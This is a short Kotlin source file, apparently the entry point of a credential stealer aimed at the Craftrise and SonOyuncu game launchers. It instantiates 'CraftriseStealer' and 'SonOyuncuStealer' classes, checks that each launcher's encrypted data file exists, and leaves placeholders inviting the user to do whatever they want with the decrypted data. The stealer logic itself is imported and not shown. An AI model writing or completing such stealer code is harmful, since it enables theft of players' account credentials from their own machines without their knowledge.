package io.groax.main

import io.groax.impl.*

/**
 * @author Groax
 */
object Runnable {
    @JvmStatic
    fun main(args: Array<String>) {
        println(0 xor 10000)
        val raccoon = CraftriseStealer()
        if(raccoon.encryptedLocation.exists() && raccoon.encryptedLocation.isFile)
            raccoon.apply {
                TODO("We decrypted succesfully, now do shit you want..")
        }

        val bitwise = SonOyuncuStealer()
        if(bitwise.encryptedLocation.exists() && bitwise.encryptedLocation.isFile)
            bitwise.apply {
                TODO("We decrypted succesfully, now do shit you want..")
            }
    }
}